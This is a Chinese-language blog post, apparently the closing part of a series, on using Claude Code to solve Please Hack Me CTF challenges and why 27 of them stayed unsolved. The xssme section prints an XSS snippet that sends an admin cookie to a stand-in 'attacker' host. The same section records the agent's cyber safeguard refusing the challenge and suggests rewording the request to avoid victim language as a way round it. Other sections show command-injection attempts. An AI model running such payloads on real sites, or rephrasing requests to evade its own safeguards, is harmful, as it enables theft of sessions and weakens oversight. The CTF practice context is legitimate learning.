title : [Day 28] 用 Claude Code 刷 CTF — 進 Top 10, 卡住的題剛好畫出 script kid 的四面牆

> [Day 26](https://ithelp.ithome.com.tw/articles/10423071) 把 PHM 刷到 1720 pts, [Day 27](https://ithelp.ithome.com.tw/articles/10423456) 推到 4940 pts, 本篇是**最後一輪**: **6620 pts / 74 題 / 歷史全站 Rank 10**, 101 題每一題都獨自跑過一次. 剩下沒解的 27 題, 卡住的原因收斂成四種, 很適合當 CTF 子系列的收尾.

寫在前面 (jason3e7):

> 進 Top 10 當然爽, 但真正學到的是 agent + script kid 的能力邊界長什麼樣. 剩下沒解的題一題一題看, 四種「牆」浮出來, 每一面都不是「不會做」, 是外部條件缺一塊.

```markdown
# 刷 CTF 進 Top 10, 剩下的題剛好是 script kid 的四面牆
* Rank 10 的紀念照
  * 101 題每一題都獨自跑過一次 (今天收尾)
  * 6620 pts / 74 solved
  * 歷史全站第 10
* script kid 的四面牆
  * md5 不能上網查, 本機也爆不開
  * 沒環境測特定 libc 版本 (libc-2.23.so)
  * 更強模型還沒試過的硬題
  * 單獨題也會撞 cyber safeguards (xssme)
* 幾題意外沒解掉
  * where is flag (regex 正解不明)
  * command-executor (白名單繞不過去)
  * Pwn 剩最多 (題型多 + 高分集中)
* 收斂
  * agent + script kid 到 Top 10 可及
  * 卡點都落在能力環境 + 政策兩面
  * 再往上要人補一塊知識
```

## Rank 10 的紀念照 — Top 10 Snapshot

三輪的分數走勢:

| 檢查點 | Pts | 題數 | 事件 |
|:---|---:|---:|:---|
| Day 26 | 1720 | 27 | 八類全部碰過 |
| Day 27 | 4940 | 64 | 六類全解過, 新加入 safeguard 死因 |
| **Day 28 (本篇)** | **6620** | **74** | **Rank 10, 剩下的 27 題全部跑過一輪** |

PHM 的 Rank 是**歷史全站累積**, 不是當月也不是當週. 10 名以上的其他 9 位都是 2017-2025 期間長期累積的 top CTF player, 多半解到 90+ 題 / 7000+ pts. 這次 Day 26 到 Day 28 之間刷到 Rank 10, 中間密集解 PHM 的時間其實不到一週. agent 推圖的手感比我自己當年單人刷的時候快很多.

這一輪新吃掉的題, 挑四個最漂亮的 primitive 紀念:

- **Pwn stack (`#73, 200pts`)** — `strcmp` 當 **1-byte canary oracle**, 一次試一位元組直接 leak 整條 canary
- **Reversing a-maze (`#54, 100pts`)** — 題目是 DFA (determinstic finite automaton, 有限狀態機), 翻成 graph 跑 BFS 直接求 `-1` 轉移的 shortest path
- **Reversing termvis (`#56, 170pts`)** — Brainfuck 原始碼藏在 PNG pixel bytes, 用 `>` 跟 `<` 這類相對比較 pattern 當 fingerprint 把它拉出來
- **Misc buzzing (`#11, 100pts`)** — BMP 的 BI_BITFIELDS mask 都是 `0x41`, 每個 channel 只用 2 bit 顯示, 剩下 6 bit 藏了三組獨立 overlay, 其中一組寫著 "your flag is FLAG{...}"

這四題放一起看, 共通點是**題目架構一旦認得, 寫對應 primitive 的 code agent 很快**. 剩下沒解的, 剛好反過來.

## script kid 的四面牆 — The Four Walls

剩下 27 題全部跑過一輪之後, 卡住的原因不是題目「不會做」, 四面牆都是**外部條件缺一塊**:

### 牆一: md5 不能上網查, 本機也爆不開

Day 26 收尾講過 Crypto `slowcipher` 的 password 要是特定 anime 名詞, 這一輪同類的還撞了幾題: `md5(x) = 已知 hash` 要反推 preimage. agent 的兩條路都走不通:

- **上網查**: 題目的 hash 不在 crackstation / md5decrypt 等線上彩虹表資料庫 (作者刻意選的), agent 連幾個 lookup 都返回 "not found"
- **本機爆**: 字典檔 (rockyou、xato-net-10m) 跑完都沒中, 作者的 password 是**自己發明的字串**, 連字典擴充 (rockyou + rules、hashcat `-a 3` mask attack) 都要先猜 pattern 長什麼樣, 猜不中就是 CPU 燒半天沒結果

這類死因在 PHM 只佔 2-3 題, 但擋得很徹底. agent 真的不會「用直覺猜一個作者會想到的詞」.

### 牆二: 沒環境可以測特定 libc 版本

Pwn `#79 tictactoe-2`、`#76 petbook`、`#68 onepunch` 幾題都需要**配對特定的 glibc 版本**(大部分是 **libc-2.23.so**, 2016 年發佈的版本). 本地測 exploit 要:

```bash
# 下載對應版本 libc, 不能用系統預設 (通常是 2.31+)
curl -O https://ctf.hackme.quest/static/libc-2.23.so
# 用 LD_PRELOAD 把 binary 綁在舊 libc 上
LD_PRELOAD=./libc-2.23.so ./tictactoe
```

問題在於:

1. **PHM 很多題不給 libc** (或給的 libc 跟 server 上實際跑的不同), 要先 remote leak 出 libc 版本才能繼續寫 exploit
2. **本地跟 remote 的 libc 位址偏移 (offset) 不一樣**, 本地 payload work remote 不 work 的情況很常見
3. **agent 沒有「真的跑 server 端 binary」的環境**, 只能靠分析 + 遠端試

結果就是像 tictactoe-2 這種「OOB write primitive 已確認, 卡在 1-byte write 升級到 shell」的題, 沒有本地 libc 測試環境, 猜 partial GOT overwrite 的 byte 2 得連遠端上千次 (ASLR brute force), 跑一跑就卡住.

### 牆三: 有些真的比較難的, 還沒有用更強的模型試過

目前刷 PHM 用的是 **Sonnet 4.6**, 速度跟成本之間平衡好. 但有幾題 (`Pwn #69 raas` 類的 heap exploit chain、`Reversing #51 unpackme` 的 PE 殼) 吃深度 reversing 跟 heap 內部狀態的推理, 可能換 **Opus 4.7** (當前最強的 reasoning model) 跑同樣 context 會解掉.

這條牆的性質跟前兩面不同: **理論上可以用 agent 解, 只是我還沒把 budget 丟下去跑**. 列進來是為了誠實交代 — 這 27 題裡**真的無解**跟**還沒試強模型**的要分清楚, 不能都歸類「script kid 吃不下」.

### 牆四: 單獨一題也會撞 cyber-related safeguards

Day 27 講過 `#38-40 xssrf` 連著三題湊成 recon → payload → exfil chain, 累積到一定 context 之後整個 turn 被 drop. 這次把三題拆開獨立跑, 發現**只跑 `#38 xssme` 一題也會撞 safeguard**:

```
API Error: Claude Code is unable to respond to this request, which appears to
violate our Usage Policy. This request triggered cyber-related safeguards.
```

xssme 題目要求用 XSS 偷管理員的 cookie, 單一題的 payload 就包含:

- 寫 `<script>fetch(/admin/...).then(r=>fetch('http://attacker/?c='+r))</script>` 之類的 exfil 片段
- 用具體的 "steal admin cookie" / "exfil to attacker" 這類 victim-targeted 用語描述做什麼

→ 這個組合就足以踩線. 繞法: 把 XSS 當成「script injection to echo back a session token」這類描述, 避開 victim 詞 — 但本質上一樣, agent 側就是不產.

## 幾題意外沒解掉 — The Surprises

剩的 27 題大部分都已經在 Day 27 提過卡住的理由, 但有兩題我原本以為能解的, 這一輪也卡住了, 比較意外:

### Misc `#5 where is flag` — regex 題

題目一個 1 MB 檔案塞滿 `FLAG{...}` 跟 `fl@g` / `f1Ag` / `FROG` 這些 noise. 題意明示 "Do you know regular expression?", 寫兩層 regex 過濾乾淨得三個 candidate:

```python
import re
d = open('flag').read()
cand = re.findall(r'FLAG\{[^{}\[\]()]+\}', d)        # 排除嵌套括號
real = [c for c in set(cand)
        if not any(bad in c[5:-1] for bad in ['f1Ag','fl@g','FROG','FLAG'])]
# → ['FLAG{M4i8gtG95@oOPFg1qr8K}', 'FLAG{5t4Oc)7beFX}', 'FLAG{NqxnBo4VQkfJSc(}']
```

三個 candidate 全部送出去 **server reject**. 字元頻率分析: `_`, `-`, `.`, `!` 整份檔案都沒出現, 代表「正解不含底線跟 dash」, 排除掉一批像 `FLAG{where_is_flag}` 的猜法. 但我試了:

- 乾淨 regex 過濾出的 3 個 — 全 reject
- 開頭 leetspeak 問句 `wH3r3isFLAGc1oudyoufindit?` 的各種包裝 — 全 reject
- 空 flag `FLAG{}` (corpus 裡出現 7 次, 最多的乾淨 pattern) — reject
- Base-4 編碼 (FLAG=0, f1Ag=1, fl@g=2, FROG=3) 解出來 — 無意義亂碼

這題只有 **50 分 (最低分之一)**, 但解題數也不低. 我原本預期 agent 能靠 regex + 頻率分析秒殺, 結果作者的「正解」比單純過濾 noise 更進階, 可能是某個特殊 regex 構造或完全不同的視角. **意外**.

### Web `#37 command-executor`

題目給一個 web form 跑 shell 命令, 伺服器端:

```php
$cmd = $_GET['cmd'];
$allowed = ['ls', 'env'];                              // 白名單
if (!in_array(explode(' ', $cmd)[0], $allowed)) exit;
system(escapeshellarg($cmd));                          // 整段用 escapeshellarg 包
```

直覺上這題應該可解 — PHP 的 `escapeshellarg` 有歷史漏洞 (locale 相關、UTF-8 繞法), 加上 `explode(' ')` 只檢查第一個 token, 應該有辦法塞 `; cat flag` 之類東西. 但 agent 試了:

- `ls; cat flag` → `escapeshellarg` 把整段當 single arg, system 執行 `/bin/sh -c "'ls; cat flag'"` 不吃
- `ls $(cat flag)` → 同上
- UTF-8 繞 escapeshellarg → PHP 7.4+ 已修
- `env PATH=/some/path cat`、`env BASH_ENV=... bash` → explode(' ') 第一個 token 不是白名單

這題只有 100 分, 我原本以為 PHP RCE 套路 agent 吃光光, 結果 escapeshellarg + 白名單這組合刷新了我對 "合格的 input sanitization" 的印象. **也意外**.

### PWN 剩最多 — 題型 + 高分集中

剩的 27 題分佈不均:

| 類別 | 剩下 | 平均分 | 典型卡點 |
|:---|---:|---:|:---|
| **Pwn** | **16** | **~190** | 牆二 (libc 版本) / 牆三 (強模型未試) |
| Reversing | 7 | ~230 | 牆三 (packed PE / M/o/Vfuscator / VM) |
| Misc | 2 | ~75 | 牆一 (md5) / 牆四 (where is flag) |
| Web | 2 | ~130 | 牆四 (xssme safeguard) / command-executor |

Pwn 自然剩最多, 因為:

1. **單題分數高** (160-270 分級距), 前面刷的時候優先吃其他類的高 CP 題
2. **題型分散** (shellcode / heap / canary bypass / libc redirect / FSOP), 每題獨立難度高
3. **工時集中** (單題 30 分鐘到 2 小時), 分不出 10 分鐘吃一題的時間窗

## 收斂 — Takeaways

把 Day 26-28 三篇講過的死因攤開, Day 28 的四面牆跟前面不是互斥, 是同一組 taxonomy 的另一個 cut:

| 死因 | Day 26-27 說法 | Day 28 說法 |
|:---|:---|:---|
| 作者專門藏文化梗 | 「文化梗 / trivia」 | 牆一 (md5 爆不開) |
| 本地測不出來 | 「server-side 硬性限制」 | 牆二 (libc 版本沒環境) |
| 深度 reasoning | 沒細分 | 牆三 (強模型沒試) |
| 政策擋 | 「cyber safeguard」 | 牆四 (單題也會撞) |

四面牆的共通點是**都不是「不會做」, 是外部條件缺一塊**:

- 牆一: 缺作者腦中的「這個 password 要是什麼詞」
- 牆二: 缺 libc 版本的對應環境
- 牆三: 缺更強模型的 budget
- 牆四: 缺繞政策的 session 設計

**agent + script kid 的組合, 到 Top 10 可及; 再往上要人補一塊知識**. 這塊知識不一定是技術難度 — PHM Top 1 的 `4qwerty7` 解 100 題也是靠 CTF 社群累積的 trivia + 多年打靶的 libc 偏移手感, 都是 agent 在 training 時沒拿到的角料.

這條分工線在 CTF 上最清楚, 因為:

- CTF 題**每題一個作者臨時發明的梗**, agent 的 pattern matching 吃不到 novelty 的那半
- 一般工程題有大量相似解法在 training data, agent 會 pattern match 很舒服
- CTF 把這個差距放大給你看, 等於是一面照妖鏡

這也是為什麼 PHM 這條線在三十篇的收尾位置 — Day 24-25 的 LeetCode (99% AC) 顯示「訓練資料飽和的題型, agent 幾乎全能」; Day 26-28 的 CTF 顯示「訓練資料沒覆蓋的題型, agent 卡在哪”. 兩頭都量過了, 中間就是你每天工作遇到的題目的落點.

## Sources

- [Please Hack Me CTF](https://ctf.hackme.quest/) — Inndy 維護的 CTF 練習站, 歷史全站排名
- [Day 26: PHM CTF 第一輪](https://ithelp.ithome.com.tw/articles/10423071) — 八類全部碰過
- [Day 27: PHM CTF 第二輪](https://ithelp.ithome.com.tw/articles/10423456) — 六類全解, 新 safeguard 死因
- [PHM writeup 彙整 (本 repo)](https://github.com/jason3e7/ai-101/tree/master/05-notes/phm) — 74 題 writeup + 27 題 pending notes
